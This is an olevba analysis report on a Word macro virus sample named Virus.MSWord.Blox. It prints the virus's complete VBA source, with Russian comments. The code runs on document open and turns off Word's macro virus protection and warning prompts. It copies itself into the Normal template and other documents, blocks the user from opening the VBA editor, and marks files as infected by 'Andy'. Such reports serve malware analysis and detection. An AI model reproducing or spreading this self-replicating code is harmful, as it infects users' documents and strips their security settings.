olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Blox
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Blox - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Блоха.bas 
in file: Virus.MSWord.Blox - OLE stream: 'Macros/VBA/Блоха'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Sub Crypt()
'    Dim M$(2)
'    A$ = "Auto"
'    O$ = "Open"
'    M$(0) = A$ + O$
'End Sub
Sub AutoOpen()
'Sub AO()
    'Result = MsgBox("Блоха", vbOKOnly)
    Call BigBloha
End Sub

Sub ViewVBCode() ' Теперь редактор VB перестанет запускаться ;)))
    'Dialogs(wdDialogToolsMacro).Show '.Display
End Sub

Sub ToolsOptions() ' Теперь юзер не сможет поменять настройки редактора ;)))
End Sub

Sub BigBloha()

    ' Отключаем различные предупредительные сообщения, изменяя установки редактора Word
    With Options
        .ConfirmConversions = False ' True if Word displays the "Convert File" dialog box before it opens or inserts a file that isn't a Word document or template.
        .VirusProtection = False    ' True if Word displays a built-in warning message whenever you open a document or template that might contain macro viruses.
        .SaveNormalPrompt = False   ' True if Word prompts the user for confirmation to save changes to the Normal template before it quits.
    End With

    On Error Resume Next ' Включаем внутреннию обработку ошибок
    ' возникновение ошибки выполнения приводит к передаче управления на инструкцию, непосредственно следующую за инструкцией, при выполнении которой возникла ошибка.


    Set cntnr = MacroContainer
    motherName = UCase(cntnr.Name) ' Имя док-та, из которого запущен макрос
    experemental = UCase(MacroContainer.Name)
    
    targetName = UCase(ActiveDocument.Name) ' Имя активного в данный момент док-та
    
    ' Находим полное имя цели:
    If motherName = targetName Then ' => Мы запущены из левого док-та
        TargetFullName = NormalTemplate.FullName ' цель: Нормальный шаблон
        MotherFullName = ActiveDocument.FullName ' источник: Активный док-т
        'Копируем себя (весь файл целиком)в директорию с normal.dot:
        ActiveDocument.SaveAs FileName:=NormalTemplate.Path + "\template.doc" ', FileFormat:=wdFormatText, WritePassword:="pass" '2 способ CopyFile
        ActiveDocument.SaveAs FileName:=MotherFullName 'Восстанавливаем имя файла
        f0 = 0
    Else                            ' => Мы запущены из шаблона (normal.dot наверняка)
        TargetFullName = ActiveDocument.FullName ' цель: Активный док-т
        'MotherFullName = NormalTemplate.FullName ' источник
        MotherFullName = NormalTemplate.Path + "\template.doc"
        f0 = 1
    End If
    
'******************************************************************************
'******************************************************************************
    'Копируем  макрос (Object:=wdOrganizerObjectProjectItems) в документ Destination:=two$ из док-та Source:=one$
    Application.OrganizerCopy _
          Source:=MotherFullName, _
          Destination:=TargetFullName, _
          Name:="Блоха", _
          Object:=wdOrganizerObjectProjectItems    'признак того, что будем копировать макрос
'******************************************************************************
'******************************************************************************
  
    'Сохраняем изменения в жертве:
    'If f0 = 0 Then NormalTemplate.Save Else ActiveDocument.Save
    If f0 = 1 Then ActiveDocument.Save
    
    
'******* Заполняем инфу о текущем док-те (автор,тема,заметки и т.д)
    With Dialogs(wdDialogFileSummaryInfo) ' Подготавливаем стандартную диалоговую форму wdDialogFileSummaryInfo
        .Author = "Andy"
        .Title = "Infected Document"
        .Subject = "Macro Virus Infection by Andy"
        .Comments = "Hello from Andy !"
        .Execute 'Включаем все эти установки ;)
    End With
'*******
    
'******* Защищаем текущий док-т от юзера ;)
With ActiveDocument
    ''.ReadOnlyRecommended = False ' Разрешаем изменения этого (активного) док-та
    ''.Password = ""               'и ставим пароль на открытие док-та
    ''.WritePassword = ""          ' Пароль от сохранения изменений в док-те
End With
'*******


On Error GoTo -1: On Error GoTo 0 ' Отключение обработки ошибки
    

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Andy                |May detect Anubis Sandbox                    |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

